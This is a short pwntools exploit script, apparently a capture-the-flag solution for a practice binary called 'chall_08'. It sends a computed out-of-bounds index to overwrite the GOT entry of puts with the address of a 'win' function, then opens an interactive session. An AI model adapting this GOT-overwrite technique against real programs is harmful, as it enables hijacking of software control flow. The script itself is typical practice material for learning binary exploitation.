from pwn import *
def main():
	p = process("./chall_08")
	binary = context.binary = ELF("./chall_08")
	payload = str((binary.got.puts - binary.sym.target) // 8)
	p.sendline(payload)
	payload = str(binary.sym.win)
	p.sendline(payload)
	p.interactive()
main()
